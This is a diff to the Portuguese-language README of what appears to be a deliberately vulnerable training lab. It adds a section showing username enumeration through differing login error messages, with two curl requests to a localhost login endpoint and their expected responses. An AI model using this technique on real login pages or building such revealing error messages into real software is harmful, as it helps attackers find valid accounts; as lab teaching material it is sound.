@@ -88,6 +88,34 @@ Rota:
 POST /login
 ```
 
+Enumeracao de usuarios por mensagens de erro:
+
+```bash
+curl -i -X POST http://localhost:8088/login \
+  -d "username=naoexiste" \
+  -d "password=teste"
+```
+
+Resultado esperado:
+
+```text
+Usuario nao encontrado.
+```
+
+```bash
+curl -i -X POST http://localhost:8088/login \
+  -d "username=joao" \
+  -d "password=errada"
+```
+
+Resultado esperado:
+
+```text
+Senha invalida.
+```
+
+Essa enumeracao e intencional no lab e nao possui flag propria.
+
 Payload funcional:
 
 ```text
